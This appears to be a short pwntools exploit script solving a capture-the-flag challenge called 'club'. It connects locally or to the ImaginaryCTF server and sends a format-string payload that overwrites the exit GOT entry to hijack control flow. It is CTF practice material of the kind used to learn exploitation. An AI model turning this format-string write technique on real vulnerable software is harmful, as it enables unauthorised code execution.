from pwn import *

DEBUG = True

if DEBUG:
    r = process("./club")
    gdb.attach(r, api=True)
else:
    r = remote("puzzler7.imaginaryctf.org", 3003)

exit_got = 0x404048

payload = b"%4482p%10$hhn---" + p64(exit_got)

r.sendline(payload)
r.interactive()